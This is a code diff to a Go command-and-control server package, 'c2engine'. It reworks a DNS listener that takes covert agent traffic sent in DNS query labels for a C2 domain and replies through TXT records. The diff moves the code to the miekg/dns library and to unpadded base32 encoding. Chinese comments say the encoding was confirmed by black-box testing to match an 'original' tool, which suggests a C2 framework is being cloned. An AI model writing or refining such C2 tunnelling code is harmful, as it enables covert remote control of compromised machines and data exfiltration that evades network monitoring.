@@ -3,8 +3,7 @@
 package c2engine
 
 import (
-	"encoding/base64"
-	"encoding/hex"
+	"encoding/base32"
 	"fmt"
 	"log"
 	"net"
@@ -12,7 +11,7 @@ import (
 	"sync"
 	"time"
 
-	"golang.org/x/net/dns/dnsmessage"
+	"github.com/miekg/dns"
 )
 
 // ============================================================================
@@ -118,17 +117,17 @@ func (dl *DNSListener) serve(conn net.PacketConn) {
 }
 
 func (dl *DNSListener) handleDNSQuery(data []byte, addr net.Addr) {
-	var msg dnsmessage.Message
+	var msg dns.Msg
 	if err := msg.Unpack(data); err != nil {
 		return
 	}
 
-	if len(msg.Questions) == 0 {
+	if len(msg.Question) == 0 {
 		return
 	}
 
-	question := msg.Questions[0]
-	domain := question.Name.String()
+	question := msg.Question[0]
+	domain := question.Name
 
 	// Check if this query is for our C2 domain
 	if !strings.HasSuffix(strings.ToLower(domain), strings.ToLower(dl.Domain)) {
@@ -166,28 +165,15 @@ func (dl *DNSListener) handleDNSQuery(data []byte, addr net.Addr) {
 }
 
 func (dl *DNSListener) decodeData(data string) ([]byte, error) {
-	// Try hex decode first (shorter, more common for DNS)
-	if decoded, err := hex.DecodeString(data); err == nil {
-		return decoded, nil
-	}
-
-	// Try base64 (with padding fix)
-	padding := (4 - len(data)%4) % 4
-	data += strings.Repeat("=", padding)
-
-	// Replace URL-safe characters
-	data = strings.ReplaceAll(data, "-", "+")
-	data = strings.ReplaceAll(data, "_", "/")
-
-	return base64.StdEncoding.DecodeString(data)
+	// 黑盒实锤（session 171-174）：DNS 标签 = Go 标准 base32
+	// （日志 "NXDOMAIN: base32 decoding: illegal base32 data"）。
+	// "testvkey" 标签 → base32 解码 → 5 字节（长度检查源）。
+	return base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(data))
 }
 
 func (dl *DNSListener) encodeData(data string) string {
-	// Use hex for shorter messages, base64 for longer
-	if len(data) < 50 {
-		return hex.EncodeToString([]byte(data))
-	}
-	return base64.RawURLEncoding.EncodeToString([]byte(data))
+	// 原版 DNS 编码 = base32（Go 标准字母表 ABC...234567，无填充）
+	return base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(data))
 }
 
 func (dl *DNSListener) processMessage(agentID, data, remoteAddr string) string {
@@ -274,16 +260,11 @@ func (dl *DNSListener) parseDNSMessage(data string) (msgType string, payload str
 	return "unknown", data
 }
 
-func (dl *DNSListener) sendDNSResponse(conn net.PacketConn, addr net.Addr, query dnsmessage.Message, response string) {
+func (dl *DNSListener) sendDNSResponse(conn net.PacketConn, addr net.Addr, query dns.Msg, response string) {
 	// Build DNS response
-	resp := dnsmessage.Message{
-		Header: dnsmessage.Header{
-			ID:            query.Header.ID,
-			Response:      true,
-			Authoritative: true,
-		},
-		Questions: query.Questions,
-	}
+	resp := new(dns.Msg)
+	resp.SetReply(&query)
+	resp.Authoritative = true
 
 	// Encode response in TXT records
 	// Split into chunks that fit in DNS labels (63 chars max per label)
@@ -291,16 +272,14 @@ func (dl *DNSListener) sendDNSResponse(conn net.PacketConn, addr net.Addr, query
 	chunks := splitDNSChunks(encoded, 60)
 
 	for _, chunk := range chunks {
-		resp.Answers = append(resp.Answers, dnsmessage.Resource{
-			Header: dnsmessage.ResourceHeader{
-				Name:  query.Questions[0].Name,
-				Type:  dnsmessage.TypeTXT,
-				Class: dnsmessage.ClassINET,
-				TTL:   60,
+		resp.Answer = append(resp.Answer, &dns.TXT{
+			Hdr: dns.RR_Header{
+				Name:   query.Question[0].Name,
+				Rrtype: dns.TypeTXT,
+				Class:  dns.ClassINET,
+				Ttl:    60,
 			},
-			Body: &dnsmessage.TXTResource{
-				TXT: []string{chunk},
-			},
+			Txt: []string{chunk},
 		})
 	}
 
